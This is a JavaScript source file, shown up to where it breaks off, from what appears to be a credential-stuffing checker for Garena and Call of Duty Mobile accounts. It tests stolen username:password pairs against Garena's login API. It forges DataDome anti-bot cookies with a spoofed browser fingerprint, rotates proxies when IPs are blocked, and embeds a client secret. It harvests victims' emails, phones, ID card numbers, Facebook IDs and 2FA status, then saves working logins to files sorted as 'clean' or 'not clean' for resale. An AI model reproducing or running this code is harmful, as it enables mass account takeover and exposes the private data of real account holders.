/**
 * garena.js — Core Garena SSO API: prelogin, login, datadome, account/init,
 *             CODM flow, processaccount, save accounts
 * Ported from Python main.py (lines 1023-2251)
 */
const axios  = require('axios');
const crypto = require('crypto');
const fs     = require('fs');
const path   = require('path');
const { hashPassword, getPassMd5 } = require('./crypto');
const { GARENA_APP_ID, GARENA_CLIENT_ID } = require('./config');

// ── Backoff helper ────────────────────────────────────────────────────
function backoff(attempt) {
  const ms = Math.min(500 * Math.pow(2, attempt), 5000);
  return new Promise(r => setTimeout(r, ms));
}

// ── Create an axios instance with proxy support ───────────────────────
function createSession(proxyUrl) {
  const config = {
    timeout: 10000,
    maxRedirects: 5,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    },
  };

  if (proxyUrl) {
    const proto = proxyUrl.match(/^(https?|socks[45]):\/\//i);
    if (proto) {
      const scheme = proto[1].toLowerCase();
      if (scheme.startsWith('socks')) {
        const { SocksProxyAgent } = require('socks-proxy-agent');
        config.httpsAgent = new SocksProxyAgent(proxyUrl);
        config.httpAgent  = new SocksProxyAgent(proxyUrl);
      } else {
        const { HttpsProxyAgent } = require('https-proxy-agent');
        config.httpsAgent = new HttpsProxyAgent(proxyUrl);
        config.httpAgent  = new HttpsProxyAgent(proxyUrl);
      }
    }
  }

  // Cookie jar simulation
  config._cookies = {};
  const session = axios.create(config);

  // Intercept requests to inject cookies
  session.interceptors.request.use(cfg => {
    const cookieParts = [];
    for (const [k, v] of Object.entries(cfg._cookies || {})) {
      cookieParts.push(`${k}=${v}`);
    }
    if (cookieParts.length) {
      cfg.headers['cookie'] = cookieParts.join('; ');
    }
    return cfg;
  });

  // Intercept responses to extract cookies
  session.interceptors.response.use(resp => {
    const setCookie = resp.headers['set-cookie'];
    if (setCookie) {
      const cookies = Array.isArray(setCookie) ? setCookie : [setCookie];
      for (const c of cookies) {
        const parts = c.split(';')[0].split('=');
        if (parts.length >= 2) {
          const name  = parts[0].trim();
          const value = parts.slice(1).join('=').trim();
          if (name && value) {
            resp.config._cookies[name] = value;
          }
        }
      }
    }
    return resp;
  });

  return session;
}

// ── applyck — apply cookie string to session ─────────────────────────
function applyck(session, cookieString) {
  if (!cookieString) return;
  const pairs = cookieString.split(';');
  for (const pair of pairs) {
    const eq = pair.indexOf('=');
    if (eq > 0) {
      const name  = pair.substring(0, eq).trim();
      const value = pair.substring(eq + 1).trim();
      if (name && value) {
        session.defaults._cookies[name] = value;
      }
    }
  }
}

// ── getDatadomeCookie ─────────────────────────────────────────────────
async function getDatadomeCookie(session) {
  const url = 'https://dd.garena.com/js/';
  const headers = {
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br, zstd',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://account.garena.com',
    'pragma': 'no-cache',
    'referer': 'https://account.garena.com/',
    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
  };

  const jsData = JSON.stringify({
    ttst: 76.70000004768372, ifov: false, hc: 4, br_oh: 824, br_ow: 1536,
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    wbd: false, dp0: true, tagpu: 5.738121195951787, wdif: false, wdifrm: false,
    npmtm: false, br_h: 738, br_w: 260, isf: false, nddc: 1, rs_h: 864, rs_w: 1536,
    rs_cd: 24, phe: false, nm: false, jsf: false, lg: "en-US", pr: 1.25,
    ars_h: 824, ars_w: 1536, tz: -480, str_ss: true, str_ls: true, str_idb: true,
    str_odb: false, plgod: false, plg: 5, plgne: true, plgre: true, plgof: false,
    plggt: false, pltod: false, hcovdr: false, hcovdr2: false, plovdr: false,
    plovdr2: false, ftsovdr: false, ftsovdr2: false, lb: false, eva: 33, lo: false,
    ts_mtp: 0, ts_tec: false, ts_tsa: false, vnd: "Google Inc.", bid: "NA",
    mmt: "application/pdf,text/pdf", plu: "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
    hdn: false, awe: false, geb: false, dat: false, med: "defined", aco: "probably",
    acots: false, acmp: "probably", acmpts: true, acw: "probably", acwts: false,
    acma: "maybe", acmats: false, acaa: "probably", acaats: true, ac3: "", ac3ts: false,
    acf: "probably", acfts: false, acmp4: "maybe", acmp4ts: false, acmp3: "probably",
    acmp3ts: false, acwm: "maybe", acwmts: false, ocpt: false, vco: "", vcots: false,
    vch: "probably", vchts: true, vcw: "probably", vcwts: true, vc3: "maybe",
    vc3ts: false, vcmp: "", vcmpts: false, vcq: "maybe", vcqts: false,
    vc1: "probably", vc1ts: true, dvm: 8, sqt: false, so: "landscape-primary",
    bda: false, wdw: true, prm: true, tzp: true, cvs: true, usb: true, cap: true,
    tbf: false, lgs: true, tpd: true
  });

  const payload = {
    jsData: jsData,
    eventCounters: '[]',
    jsType: 'ch',
    cid: 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
    ddk: 'AE3F04AD3F0D3A462481A337485081',
    Referer: 'https://account.garena.com/',
    request: '/',
    responsePage: 'origin',
    ddv: '4.35.4'
  };

  const data = Object.entries(payload)
    .map(([k, v]) => `${k}=${encodeURIComponent(String(v))}`)
    .join('&');

  try {
    const response = await session.post(url, data, { headers });
    const json = response.data;
    if (json.status === 200 && json.cookie) {
      const cookieString = json.cookie;
      const datadome = cookieString.split(';')[0].split('=')[1];
      return datadome;
    }
    console.error('[DATADOME] Cookie not found in response. Status:', json.status);
    return null;
  } catch (e) {
    console.error('[DATADOME] Error getting cookie:', e.message);
    return null;
  }
}

// ── prelogin ──────────────────────────────────────────────────────────
async function prelogin(session, account, datadomeManager, geoRotator) {
  // Check for unsupported characters
  try {
    Buffer.from(account, 'latin-1');
  } catch {
    return [null, null, null];
  }

  const url = 'https://sso.garena.com/api/prelogin';
  const retries = 2;

  for (let attempt = 0; attempt < retries; attempt++) {
    try {
      const cookieParts = [];
      const cookies = session.defaults._cookies || {};
      for (const name of ['apple_state_key', 'datadome', 'sso_key']) {
        if (cookies[name]) cookieParts.push(`${name}=${cookies[name]}`);
      }

      const headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'connection': 'keep-alive',
        'host': 'sso.garena.com',
        'referer': `https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account=${account}`,
        'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
      };

      if (cookieParts.length) {
        headers['cookie'] = cookieParts.join('; ');
      }

      const params = {
        app_id: '10100',
        account: account,
        format: 'json',
        id: String(Date.now())
      };

      if (attempt > 0) {
        console.log(`      🔄 Retry ${attempt + 1}/${retries}`);
      }

      const response = await session.get(url, { headers, params, timeout: 8000 });

      // Extract cookies from response
      const newCookies = {};
      const setCookie = response.headers['set-cookie'];
      if (setCookie) {
        const cookieArr = Array.isArray(setCookie) ? setCookie : [setCookie];
        for (const c of cookieArr) {
          const parts = c.split(';')[0].split('=');
          if (parts.length >= 2) {
            const name  = parts[0].trim();
            const value = parts.slice(1).join('=').trim();
            if (name && value) newCookies[name] = value;
          }
        }
      }

      // Apply important cookies to session
      for (const [name, value] of Object.entries(newCookies)) {
        if (['datadome', 'apple_state_key', 'sso_key'].includes(name)) {
          session.defaults._cookies[name] = value;
          if (name === 'datadome' && datadomeManager) {
            datadomeManager.set(geoRotator?.getCurrentProxy?.(), value);
          }
        }
      }

      if (response.status === 403) {
        console.error('      🚫 Access denied (403)');
        if (datadomeManager && geoRotator) {
          const newProxy = datadomeManager.handle403(geoRotator.getCurrentProxy(), geoRotator);
          return ['IP_BLOCKED', null, newCookies.datadome || null];
        }
        return [null, null, newCookies.datadome || null];
      }

      const data = response.data;
      if (data.error) {
        console.error(`      ✘ Error: ${data.error}`);
        return [null, null, newCookies.datadome || null];
      }

      const v1 = data.v1;
      const v2 = data.v2;
      if (!v1 || !v2) {
        console.error('      ✘ Missing authentication data');
        return [null, null, newCookies.datadome || null];
      }

      return [v1, v2, newCookies.datadome || null];

    } catch (e) {
      if (e.code === 'ECONNABORTED' || e.code === 'ETIMEDOUT') {
        console.warn('      ⏱️ Proxy timeout');
        return ['CONN_ERROR', null, null];
      }
      const msg = e.message || '';
      if (msg.includes('ECONNREFUSED') || msg.includes('proxy') || msg.includes('socket') ||
          msg.includes('ECONNRESET') || msg.includes('HPE_INVALID_CONSTANT')) {
        console.warn(`      🔌 Proxy connection failed: ${msg.slice(0, 80)}`);
        return ['CONN_ERROR', null, null];
      }
      if (e.response?.status === 403) {
        console.error('      🚫 Access denied (403)');
        if (datadomeManager && geoRotator) {
          datadomeManager.handle403(geoRotator.getCurrentProxy(), geoRotator);
          return ['IP_BLOCKED', null, null];
        }
        return [null, null, null];
      }
      console.error(`      💥 Unexpected error: ${msg.slice(0, 50)}`);
      if (attempt < retries - 1) await backoff(attempt);
    }
  }
  return [null, null, null];
}

// ── login ─────────────────────────────────────────────────────────────
async function login(session, account, password, v1, v2, geoRotator) {
  const hashedPassword = hashPassword(password, v1, v2);
  const url = 'https://sso.garena.com/api/login';

  const cookieParts = [];
  const cookies = session.defaults._cookies || {};
  for (const name of ['apple_state_key', 'datadome', 'sso_key']) {
    if (cookies[name]) cookieParts.push(`${name}=${cookies[name]}`);
  }

  const headers = {
    'accept': 'application/json, text/plain, */*',
    'referer': 'https://account.garena.com/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
  };

  if (cookieParts.length) {
    headers['cookie'] = cookieParts.join('; ');
  }

  const params = {
    app_id: '10100',
    account: account,
    password: hashedPassword,
    redirect_uri: 'https://account.garena.com/',
    format: 'json',
    id: String(Date.now())
  };

  const retries = 2;
  for (let attempt = 0; attempt < retries; attempt++) {
    try {
      const response = await session.get(url, { headers, params, timeout: 8000 });

      // Extract cookies
      const loginCookies = {};
      const setCookie = response.headers['set-cookie'];
      if (setCookie) {
        const cookieArr = Array.isArray(setCookie) ? setCookie : [setCookie];
        for (const c of cookieArr) {
          const parts = c.split(';')[0].split('=');
          if (parts.length >= 2) {
            const name  = parts[0].trim();
            const value = parts.slice(1).join('=').trim();
            if (name && value) loginCookies[name] = value;
          }
        }
      }

      for (const [name, value] of Object.entries(loginCookies)) {
        if (['sso_key', 'apple_state_key', 'datadome'].includes(name)) {
          session.defaults._cookies[name] = value;
        }
      }

      const data = response.data;
      if (data.error) {
        if (data.error === "ACCOUNT DOESNT EXIST") return null;
        if (data.error.toLowerCase().includes('captcha')) {
          await backoff(attempt);
          continue;
        }
        return null;
      }

      const ssoKey = loginCookies.sso_key || cookies.sso_key;
      return ssoKey || null;

    } catch (e) {
      if (e.code === 'ECONNABORTED' || e.code === 'ETIMEDOUT' ||
          e.message?.includes('ECONNREFUSED') || e.message?.includes('proxy')) {
        console.warn('      🔌 Proxy error on login — rotating');
        if (geoRotator) geoRotator.forceRotate();
        if (attempt < retries - 1) await backoff(attempt);
        continue;
      }
      console.error(`      ✘ Login request failed (attempt ${attempt + 1}): ${e.message}`);
      if (attempt < retries - 1) await backoff(attempt);
    }
  }
  return null;
}

// ── CODM OAuth flow ───────────────────────────────────────────────────
async function getCodmAccessToken(session) {
  try {
    const randomId = String(Date.now());
    const grantUrl = 'https://100082.connect.garena.com/oauth/token/grant';
    const grantHeaders = {
      'Host': '100082.connect.garena.com',
      'Connection': 'keep-alive',
      'sec-ch-ua-platform': '"Android"',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
      'Accept': 'application/json, text/plain, */*',
      'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
      'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'sec-ch-ua-mobile': '?1',
      'Origin': 'https://100082.connect.garena.com',
      'X-Requested-With': 'com.garena.game.codm',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code',
      'Accept-Encoding': 'gzip, deflate, br, zstd',
      'Accept-Language': 'en-US,en;q=0.9'
    };

    const { randomBytes } = require('crypto');
    const deviceId = `02-${randomBytes(16).toString('hex')}-${randomBytes(16).toString('hex')}`;
    const grantData = `client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id=${randomId}`;

    const grantResponse = await session.post(grantUrl, grantData, { headers: grantHeaders, timeout: 10000 });
    const grantJson = grantResponse.data;
    const authCode = grantJson.code || '';

    if (!authCode) return ['', '', ''];

    const tokenUrl = 'https://100082.connect.garena.com/oauth/token/exchange';
    const tokenHeaders = {
      'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Host': '100082.connect.garena.com',
      'Connection': 'Keep-Alive',
      'Accept-Encoding': 'gzip'
    };

    const tokenData = `grant_type=authorization_code&code=${authCode}&device_id=${deviceId}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415`;

    const tokenResponse = await session.post(tokenUrl, tokenData, { headers: tokenHeaders, timeout: 10000 });
    const tokenJson = tokenResponse.data;

    return [
      tokenJson.access_token || '',
      tokenJson.open_id || '',
      tokenJson.uid || ''
    ];
  } catch (e) {
    console.error('[CODM] Error getting access token:', e.message);
    return ['', '', ''];
  }
}

async function processCodmCallback(session, accessToken) {
  try {
    // Try old callback
    const oldUrl = `https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token=${accessToken}`;
    const oldHeaders = {
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36',
      'referer': 'https://auth.garena.com/'
    };

    const oldResp = await session.get(oldUrl, { headers: oldHeaders, maxRedirects: 0, timeout: 10000, validateStatus: () => true });
    const location = oldResp.headers['location'] || '';

    if (location.includes('err=3')) return [null, 'no_codm'];
    if (location.includes('token=')) {
      const token = location.split('token=')[1].split('&')[0];
      return [token, 'success'];
    }

    // Try AOS callback
    const aosUrl = `https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token=${accessToken}`;
    const aosHeaders = {
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
      'referer': 'https://100082.connect.garena.com/',
      'x-requested-with': 'com.garena.game.codm'
    };

    const aosResp = await session.get(aosUrl, { headers: aosHeaders, maxRedirects: 0, timeout: 10000, validateStatus: () => true });
    const aosLocation = aosResp.headers['location'] || '';

    if (aosLocation.includes('err=3')) return [null, 'no_codm'];
    if (aosLocation.includes('token=')) {
      const token = aosLocation.split('token=')[1].split('&')[0];
      return [token, 'success'];
    }

    return [null, 'unknown_error'];
  } catch (e) {
    console.error('[CODM] Error processing callback:', e.message);
    return [null, 'error'];
  }
}

async function getCodmUserInfo(session, token) {
  try {
    // Try JWT decode
    const parts = token.split('.');
    if (parts.length === 3) {
      let payload = parts[1];
      const padding = 4 - (payload.length % 4);
      if (padding !== 4) payload += '='.repeat(padding);
      const decoded = Buffer.from(payload, 'base64url').toString('utf-8');
      const jwtData = JSON.parse(decoded);
      const userData = jwtData.user || {};
      if (userData) {
        return {
          codm_nickname: userData.codm_nickname || userData.nickname || 'N/A',
          codm_level: userData.codm_level || 'N/A',
          region: userData.region || 'N/A',
          uid: userData.uid || 'N/A',
          open_id: userData.open_id || 'N/A',
          t_open_id: userData.t_open_id || 'N/A'
        };
      }
    }

    // Fallback to API
    const url = 'https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/';
    const headers = {
      'accept': 'application/json, text/plain, */*',
      'codm-delete-token': token,
      'origin': 'https://delete-request-aos.codm.garena.co.id',
      'referer': 'https://delete-request-aos.codm.garena.co.id/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
      'x-requested-with': 'com.garena.game.codm'
    };

    const response = await session.get(url, { headers, timeout: 10000 });
    const data = response.data;
    const userData = data.user || {};
    if (userData) {
      return {
        codm_nickname: userData.codm_nickname || 'N/A',
        codm_level: userData.codm_level || 'N/A',
        region: userData.region || 'N/A',
        uid: userData.uid || 'N/A',
        open_id: userData.open_id || 'N/A',
        t_open_id: userData.t_open_id || 'N/A'
      };
    }
    return {};
  } catch (e) {
    console.error('[CODM] Error getting user info:', e.message);
    return {};
  }
}

async function checkCodmAccount(session) {
  let hasCodm = false;
  let codmInfo = {};
  try {
    const [accessToken, openId, uid] = await getCodmAccessToken(session);
    if (!accessToken) return [hasCodm, codmInfo];

    const [codmToken, status] = await processCodmCallback(session, accessToken);
    if (status === 'no_codm') return [hasCodm, codmInfo];
    if (status !== 'success' || !codmToken) return [hasCodm, codmInfo];

    codmInfo = await getCodmUserInfo(session, codmToken);
    if (codmInfo && Object.keys(codmInfo).length) {
      hasCodm = true;
    }
  } catch (e) {
    console.error('[CODM] Error checking:', e.message);
  }
  return [hasCodm, codmInfo];
}

// ── Parse account details ────────────────────────────────────────────
function parseAccountDetails(data) {
  const userInfo = data.user_info || data;

  const accountInfo = {
    uid: userInfo.uid || 'N/A',
    username: userInfo.username || 'N/A',
    nickname: userInfo.nickname || 'N/A',
    email: userInfo.email || 'N/A',
    email_verified: !!(userInfo.email_v),
    email_verified_time: userInfo.email_verified_time || 0,
    email_verify_available: !!(userInfo.email_verify_available),

    security: {
      password_strength: userInfo.password_s || 'N/A',
      two_step_verify: !!(userInfo.two_step_verify_enable),
      authenticator_app: !!(userInfo.authenticator_enable),
      facebook_connected: !!(userInfo.is_fbconnect_enabled),
      facebook_account: userInfo.fb_account || null,
      suspicious: !!(userInfo.suspicious)
    },

    personal: {
      real_name: userInfo.realname || 'N/A',
      id_card: userInfo.idcard || 'N/A',
      id_card_length: userInfo.idcard_length || 'N/A',
      country: userInfo.acc_country || 'N/A',
      country_code: userInfo.country_code || 'N/A',
      mobile_no: userInfo.mobile_no || 'N/A',
      mobile_binding_status: (userInfo.mobile_binding_status && userInfo.mobile_no) ? 'Bound' : 'Not Bound',
      extra_data: userInfo.realinfo_extra_data || {}
    },

    profile: {
      avatar: userInfo.avatar || 'N/A',
      signature: userInfo.signature || 'N/A',
      shell_balance: userInfo.shell || 0
    },

    status: {
      account_status: userInfo.status === 1 ? 'Active' : 'Inactive',
      whitelistable: !!(userInfo.whitelistable),
      realinfo_updatable: !!(userInfo.realinfo_updatable)
    },

    binds: [],
    game_info: []
  };

  const email = accountInfo.email;
  if (email && email !== 'N/A' && !email.startsWith('***') && email.includes('@') &&
      !email.endsWith('@gmail.com') && !email.includes('****')) {
    accountInfo.binds.push('Email');
  }

  const mobile = accountInfo.personal.mobile_no;
  if (mobile && mobile !== 'N/A' && mobile.trim()) {
    accountInfo.binds.push('Phone');
  }

  if (accountInfo.security.facebook_connected) {
    accountInfo.binds.push('Facebook');
  }

  const idCard = accountInfo.personal.id_card;
  if (idCard && idCard !== 'N/A' && idCard.trim()) {
    accountInfo.binds.push('ID Card');
  }

  if (userInfo.email_v === 1 || accountInfo.binds.length > 0) {
    accountInfo.is_clean = false;
    accountInfo.bind_status = `Bound (${accountInfo.binds.join(', ') || 'Email Verified'})`;
  } else {
    accountInfo.is_clean = true;
    accountInfo.bind_status = 'Clean';
  }

  const securityIndicators = [];
  if (accountInfo.security.two_step_verify) securityIndicators.push('2FA');
  if (accountInfo.security.authenticator_app) securityIndicators.push('Auth App');
  if (accountInfo.security.suspicious) securityIndicators.push('[WARNING] Suspicious');
  accountInfo.security_status = securityIndicators.length ? securityIndicators.join(' | ') : '[SUCCESS] Normal';

  return accountInfo;
}

// ── Save accounts ────────────────────────────────────────────────────
function saveCodmAccount(account, password, codmInfo, country, isClean, resultFolder) {
  try {
    if (!codmInfo) return;
    const codmLevel = parseInt(codmInfo.codm_level) || 0;
    const region = (codmInfo.region || 'N/A').toUpperCase();
    const nickname = codmInfo.codm_nickname || 'N/A';

    let countryCode;
    if (typeof country === 'object' && country !== null) {
      countryCode = (country.country || region).toUpperCase();
    } else {
      countryCode = (country && country !== 'N/A' && country !== 'NONE') ? country.toUpperCase() : region;
    }
    if (!countryCode || countryCode === 'N/A' || countryCode === 'NONE') {
      countryCode = (region && region !== 'N/A') ? region : 'UNKNOWN';
    }

    let levelRange;
    if (codmLevel <= 50) levelRange = '1-50';
    else if (codmLevel <= 100) levelRange = '51-100';
    else if (codmLevel <= 150) levelRange = '101-150';
    else if (codmLevel <= 200) levelRange = '151-200';
    else if (codmLevel <= 250) levelRange = '201-250';
    else if (codmLevel <= 300) levelRange = '251-300';
    else if (codmLevel <= 350) levelRange = '301-350';
    else levelRange = '351+';

    const cleanFolder = isClean ? 'Clean' : 'NotClean';
    const folderPath = path.join(resultFolder, cleanFolder, countryCode);
    fs.mkdirSync(folderPath, { recursive: true });

    const levelFile = path.join(folderPath, `${levelRange}_accounts.txt`);
    if (account && password) {
      fs.appendFileSync(levelFile,
        `${account}:${password} | Level: ${codmLevel} | Nickname: ${nickname} | Region: ${region} | UID: ${codmInfo.uid || 'N/A'}\n`,
        'utf-8');
    }
  } catch {}
}

function saveCleanOrNotClean(account, password, details, codmInfo, resultFolder) {
  try {
    fs.mkdirSync(resultFolder, { recursive: true });

    const codmNickname = codmInfo?.codm_nickname || 'N/A';
    const codmUid = codmInfo?.uid || 'N/A';
    const codmLevel = codmInfo?.codm_level || 'N/A';

    const username = details.username || account;
    const email = details.email || 'N/A';
    const emailVer = details.email_verified ? 'Verified' : 'Not Verified';
    const mobile = details.personal?.mobile_no || 'N/A';
    const mobileBound = (mobile && String(mobile).trim()) ? 'Yes' : 'No';

    const fbAccount = details.security?.facebook_account || {};
    const fbLinked = details.security?.facebook_connected || (fbAccount ? true : false);
    const fbUid = fbAccount?.fb_uid || 'N/A';
    const fb = fbLinked ? `Linked (${fbUid})` : 'Not Linked';
    const fbl = fbLinked ? `https://facebook.com/${fbUid}` : 'N/A';

    const shell = details.profile?.shell_balance || 'N/A';
    const accCountry = details.personal?.country || 'N/A';
    const authenticatorEnabled = details.security?.authenticator_app ? 'Yes' : 'No';
    const twoStepEnabled = details.security?.two_step_verify ? 'Yes' : 'No';
    const isClean = details.is_clean || false;
    const cleanStatus = isClean ? 'CLEAN' : 'NOT CLEAN';

    const content = `
[LOGIN SUCCESSFUL]
=======================================
         [ACCOUNT INFO]
  [+] Username       : ${username}:${password}
  [+] Email          : ${email} (${emailVer})
  [+] Mobile No      : ${mobile}
  [+] Mobile Bound   : ${mobileBound}
  [+] FB Username    : ${fb}
  [+] FB Profile     : ${fbl}

         [GAME INFO]
  [+] CODM Nickname : ${codmNickname}
  [+] CODM UID      : ${codmUid}
  [+] CODM Level    : ${codmLevel}

         [SECURITY BINDINGS]
  [+] Garena Shells  : ${shell}
  [+] Authenticator  : ${authenticatorEnabled}
  [+] 2FA Enabled    : ${twoStepEnabled}
  [+] Account Status : ${cleanStatus}
  [] CONFIG BY: @Yukiii_ii
=======================================
`.trim() + '\n\n';

    const filePath = path.join(resultFolder, isClean ? 'clean.txt' : 'notclean.txt');

    // Check for duplicates
    const identifier = `[+] Username       : ${username}:${password}`;
    let exists = false;
    if (fs.existsSync(filePath)) {
      const existing = fs.readFileSync(filePath, 'utf-8');
      if (existing.includes(identifier)) exists = true;
    }

    if (!exists) {
      fs.appendFileSync(filePath, content, 'utf-8');
    }

    // Save to CODM folder structure
    if (codmInfo?.codm_nickname && codmInfo.codm_nickname !== 'N/A') {
      saveCodmAccount(account, password, codmInfo, accCountry, isClean, resultFolder);
    }
  } catch {}
}

function saveAccountDetailsFull(account, details, codmInfo, password, resultFolder) {
  try {
    fs.mkdirSync(resultFolder, { recursive: true });
    const shell = details.profile?.shell_balance || 'N/A';
    const country = details.personal?.country || 'N/A';
    const isClean = details.is_clean || false;

    let content = '='.repeat(60) + '\n';
    content += `Account: ${account}\n`;
    content += `Password: ${password}\n`;
    content += `UID: ${details.uid || 'N/A'}\n`;
    content += `Username: ${details.username || 'N/A'}\n`;
    content += `Nickname: ${details.nickname || 'N/A'}\n`;
    content += `Email: ${details.email || 'N/A'}\n`;
    content += `Phone: ${details.personal?.mobile_no || 'N/A'}\n`;
    content += `Country: ${country}\n`;
    content += `Shell Balance: ${shell}\n`;
    content += `Account Status: ${details.status?.account_status || 'N/A'}\n`;
    content += `Is Clean: ${isClean}\n`;
    if (codmInfo) {
      content += `CODM Name: ${codmInfo.codm_nickname || 'N/A'}\n`;
      content += `CODM UID: ${codmInfo.uid || 'N/A'}\n`;
      content += `CODM Region: ${codmInfo.region || 'N/A'}\n`;
      content += `CODM Level: ${codmInfo.codm_level || 'N/A'}\n`;
    }
    content += '='.repeat(60) + '\n\n';

    fs.appendFileSync(path.join(resultFolder, 'full_details.txt'), content, 'utf-8');
  } catch {}
}

// ── processaccount — THE CORE CHECKING FUNCTION ──────────────────────
async function processaccount(session, account, password, cookieManager, datadomeManager,
                              liveStats, geoRotator, resultFolder, telegramConfig, sendTelegramMessage) {
  const MAX_IP_BLOCK_RETRIES = 3;
  let v1 = null, v2 = null, newDatadome = null;

  try {
    for (let ipBlockAttempt = 0; ipBlockAttempt < MAX_IP_BLOCK_RETRIES; ipBlockAttempt++) {
      // Clear session datadome
      delete session.defaults._cookies.datadome;
      const currentDatadome = datadomeManager.get(geoRotator?.getCurrentProxy?.());
      if (currentDatadome) {
        session.defaults._cookies.datadome = currentDatadome;
      }

      [v1, v2, newDatadome] = await prelogin(session, account, datadomeManager, geoRotator);

      if (v1 === 'IP_BLOCKED') {
        console.warn(`[RETRY] IP blocked attempt ${ipBlockAttempt + 1}/${MAX_IP_BLOCK_RETRIES} — rotating proxy...`);
        const newProxy = geoRotator.forceRotate();
        // Update session proxy
        if (newProxy) await updateSessionProxy(session, newProxy);
        const freshDd = await getDatadomeCookie(session);
        if (freshDd) {
          datadomeManager.set(geoRotator.getCurrentProxy(), freshDd);
          session.defaults._cookies.datadome = freshDd;
        }
        continue;
      }

      if (v1 === 'CONN_ERROR') {
        console.warn(`[RETRY] Connection error attempt ${ipBlockAttempt + 1}/${MAX_IP_BLOCK_RETRIES} — smart rotating...`);
        geoRotator.smartRotate();
        const newProxy = geoRotator.getCurrentProxy();
        if (newProxy) await updateSessionProxy(session, newProxy);
        continue;
      }

      break;
    }

    if (v1 === 'IP_BLOCKED' || v1 === 'CONN_ERROR') {
      console.error(`[RETRY] Exhausted ${MAX_IP_BLOCK_RETRIES} retries for ${account} — skipping`);
      liveStats.recordError();
      return `🚨 Proxy exhausted - Skipped after ${MAX_IP_BLOCK_RETRIES} retries`;
    }

    if (!v1 || !v2) {
      liveStats.recordBad();
      return '';
    }

    if (newDatadome) {
      datadomeManager.set(geoRotator?.getCurrentProxy?.(), newDatadome);
      session.defaults._cookies.datadome = newDatadome;
    }

    const ssoKey = await login(session, account, password, v1, v2, geoRotator);
    if (!ssoKey) {
      liveStats.recordBad();
      return '';
    }

    // ── account/init with retry on 403 ─────────────────────────────
    let accountData = null;
    for (let initAttempt = 0; initAttempt < 4; initAttempt++) {
      const cookieParts = [];
      const cookies = session.defaults._cookies || {};
      for (const name of ['apple_state_key', 'datadome', 'sso_key']) {
        if (cookies[name]) cookieParts.push(`${name}=${cookies[name]}`);
      }

      const headers = {
        'accept': '*/*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
      };
      if (cookieParts.length) headers['cookie'] = cookieParts.join('; ');

      try {
        const response = await session.get('https://account.garena.com/api/account/init', {
          headers, timeout: 10000, validateStatus: () => true
        });

        if (response.status === 403) {
